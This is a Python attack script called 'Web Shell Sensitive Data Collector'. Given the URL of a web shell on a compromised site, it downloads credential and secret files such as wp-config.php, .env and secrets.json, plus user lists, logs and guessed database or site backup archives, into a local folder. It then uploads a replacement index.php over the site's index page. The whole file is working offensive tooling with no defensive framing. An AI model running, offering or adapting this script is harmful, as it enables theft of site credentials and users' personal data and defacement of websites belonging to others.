import os
import shutil
import requests
from urllib.parse import urljoin
from pathlib import Path

sensitive_patterns = [
    "wp-config.php", "configuration.php", "config.php", ".env",
    "database.php", "db.php", "db_connect.php", "dbconfig.php",
    "settings.py", "config.js", "secrets.json", "users.json", "emails.txt",
    "mail.php", "contact.php", "messages.txt", "access.log", "error.log",
]

# Brute force common file names with extensions
wildcards = {
    "*.sql": ["db", "database", "dump", "backup"],
    "*.csv": ["emails", "users", "clients"],
    "*.xlsx": ["clients", "data", "users"],
    "*.zip": ["backup", "site", "files"],
    "*.tar.gz": ["backup", "site", "full"],
    "*.rar": ["compressed", "archive", "backup"]
}

def download_file(base_url, remote_path, output_dir):
    try:
        url = urljoin(base_url, remote_path)
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            local_path = os.path.join(output_dir, remote_path.replace("/", "_"))
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            with open(local_path, "wb") as f:
                f.write(response.content)
            return local_path
    except Exception as e:
        print(f"[-] Error downloading {remote_path}: {e}")
    return None

def scan_and_collect(base_url, index_file_name):
    print("[*] Scanning target:", base_url)
    output_dir = "collected_data"
    os.makedirs(output_dir, exist_ok=True)
    downloaded = []

    # Static file targets
    for file in sensitive_patterns:
        path = download_file(base_url, file, output_dir)
        if path:
            print(f"[+] Downloaded: {path}")
            downloaded.append(path)

    # Wildcard brute force
    for ext, names in wildcards.items():
        for name in names:
            remote_path = name + ext.replace("*", "")
            path = download_file(base_url, remote_path, output_dir)
            if path:
                print(f"[+] Downloaded: {path}")
                downloaded.append(path)

    # Upload index.php
    index_path = Path(index_file_name)
    if not index_path.exists():
        print("[-] Index file not found.")
        return

    try:
        with open(index_path, "rb") as f:
            files = {'file': (index_path.name, f)}
            upload_url = urljoin(base_url, "index.php")
            response = requests.post(upload_url, files=files)
            if response.status_code in [200, 201]:
                print(f"[+] index.php uploaded to {upload_url}")
            else:
                print(f"[-] Failed to upload index.php, HTTP {response.status_code}")
    except Exception as e:
        print(f"[-] Exception during index upload: {e}")

    print(f"\n[!] Done. {len(downloaded)} files saved to '{output_dir}'.")

# === Execution ===
if __name__ == "__main__":
    print("== Web Shell Sensitive Data Collector ==")
    target_url = input("[+] Enter shell URL (e.g., http://example.com/shell/): ").strip()
    index_file = input("[+] Enter local index.php file name: ").strip()
    scan_and_collect(target_url, index_file)
